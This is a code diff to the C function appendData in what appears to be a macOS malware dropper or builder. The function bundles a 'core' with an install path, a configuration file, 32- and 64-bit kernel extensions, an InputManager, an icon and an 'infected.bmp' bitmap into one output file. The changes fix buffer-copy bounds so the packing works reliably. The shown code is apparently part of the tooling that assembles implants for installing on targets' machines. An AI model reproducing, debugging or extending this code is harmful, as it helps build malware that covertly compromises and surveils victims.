@@ -258,7 +258,6 @@ int appendData (char *inputFilePointer,
 	char *bitmapFileName		  = NULL;
 	if(strcmp(bitmapFilePath, "null"))
 		bitmapFileName		  = "infected.bmp";
-
 	char *inputFileName         = basename(inputFilePath);
 	char *outputFileName        = basename(outputFilePath);
 
@@ -352,13 +351,13 @@ int appendData (char *inputFilePointer,
 	//
 	printf("[ii] Core %s, installpath: %s\n", coreFileName, installPath);
 	resource.type = RESOURCE_CORE;
-	memset(resource.name, 0, strlen(resource.name));
-	memcpy(resource.name, coreFileName, sizeof(resource.name));
+	memset(resource.name, 0, sizeof(resource.name));
+	memcpy(resource.name, coreFileName, min(sizeof(resource.name), strlen(coreFileName)));
 
 	resource.size = gCoreFileSize;
 
-	memset(resource.path, 0, strlen(resource.path));
-	memcpy(resource.path, installPath, sizeof(resource.path));
+	memset(resource.path, 0, sizeof(resource.path));
+	memcpy(resource.path, installPath, min(sizeof(resource.path), strlen(installPath)));
 
 	memcpy(outputFilePointer + offset,
 		&resource,
@@ -404,10 +403,10 @@ int appendData (char *inputFilePointer,
 
 	resource.type = RESOURCE_CONF;
 	memset(resource.name, 0, sizeof(resource.name));
-	memcpy(resource.name, confFileName, sizeof(resource.name));
+	memcpy(resource.name, confFileName, min(sizeof(resource.name), strlen(confFileName)));
 	resource.size = gConfFileSize;
 	memset(resource.path, 0, sizeof(resource.path));
-	memcpy(resource.path, installPath, sizeof(resource.path));
+	memcpy(resource.path, installPath, min(sizeof(resource.path),strlen(installPath)));
 
 	memcpy(outputFilePointer + offset,
 		&resource,
@@ -452,10 +451,10 @@ int appendData (char *inputFilePointer,
 	printf("[ii] Kext32 %s\n", kext32FileName);
 	resource.type = RESOURCE_KEXT;
 	memset(resource.name, 0, sizeof(resource.name));
-	memcpy(resource.name, kext32FileName, sizeof(resource.name));
+	memcpy(resource.name, kext32FileName, min(sizeof(resource.name), strlen(kext32FileName)));
 	resource.size = gKext32FileSize;
 	memset(resource.path, 0, sizeof(resource.path));
-	memcpy(resource.path, installPath, sizeof(resource.path));
+	memcpy(resource.path, installPath, min(sizeof(resource.path), strlen(installPath)));
 
 #ifdef DEBUG
 	printf ("offset: %x\n", offset);
@@ -504,10 +503,10 @@ int appendData (char *inputFilePointer,
 	printf("[ii] Kext64 %s\n", kext64FileName);
 	resource.type = RESOURCE_KEXT;
 	memset(resource.name, 0, sizeof(resource.name));
-	memcpy(resource.name, kext64FileName, sizeof(resource.name));
+	memcpy(resource.name, kext64FileName, min(sizeof(resource.name), strlen(kext64FileName)));
 	resource.size = gKext64FileSize;
 	memset(resource.path, 0, sizeof(resource.path));
-	memcpy(resource.path, installPath, sizeof(resource.path));
+	memcpy(resource.path, installPath, min(sizeof(resource.path), strlen(installPath)));
 
 #ifdef DEBUG
 	printf ("offset: %x\n", offset);
@@ -556,10 +555,10 @@ int appendData (char *inputFilePointer,
 	printf("[ii] InputManager %s\n", inputManagerFileName);
 	resource.type = RESOURCE_IN_MANAGER;
 	memset (resource.name, 0, sizeof (resource.name));
-	memcpy (resource.name, inputManagerFileName, sizeof (resource.name));
+	memcpy (resource.name, inputManagerFileName, min(sizeof (resource.name), strlen(inputManagerFileName)));
 	resource.size = gInputManagerFileSize;
 	memset (resource.path, 0, sizeof (resource.path));
-	memcpy (resource.path, installPath, sizeof (resource.path));
+	memcpy (resource.path, installPath, min(sizeof(resource.path), strlen(installPath)));
 
 	memcpy (outputFilePointer + offset,
 		&resource,
@@ -647,11 +646,11 @@ int appendData (char *inputFilePointer,
 	printf("[ii] Icon %s\n", iconFileName);
 
 	resource.type = RESOURCE_ICON;
-	memset (resource.name, 0, sizeof (resource.name));
-	memcpy (resource.name, iconFileName, sizeof (resource.name));
+	memset (resource.name, 0, sizeof(resource.name));
+	memcpy (resource.name, iconFileName, min(sizeof(resource.name), strlen(iconFileName)));
 	resource.size = gIconFileSize;
-	memset (resource.path, 0, sizeof (resource.path));
-	memcpy (resource.path, installPath, sizeof (resource.path));
+	memset (resource.path, 0, sizeof(resource.path));
+	memcpy (resource.path, installPath, min(sizeof(resource.path), strlen(installPath)));
 
 	memcpy (outputFilePointer + offset,
 		&resource,
@@ -696,11 +695,11 @@ int appendData (char *inputFilePointer,
 		printf("[ii] Bitmap %s\n", bitmapFileName);
 
 		resource.type = RESOURCE_BITMAP;
-		memset (resource.name, 0, sizeof (resource.name));
-		memcpy (resource.name, bitmapFileName, sizeof (resource.name));
+		memset (resource.name, 0, sizeof(resource.name));
+		memcpy (resource.name, bitmapFileName, min(sizeof(resource.name), strlen(bitmapFileName)));
 		resource.size = gBitmapFileSize;
-		memset (resource.path, 0, sizeof (resource.path));
-		memcpy (resource.path, installPath, sizeof (resource.path));
+		memset (resource.path, 0, sizeof(resource.path));
+		memcpy (resource.path, installPath, min(sizeof(resource.path), strlen(installPath)));
 
 		memcpy (outputFilePointer + offset,
 			&resource,
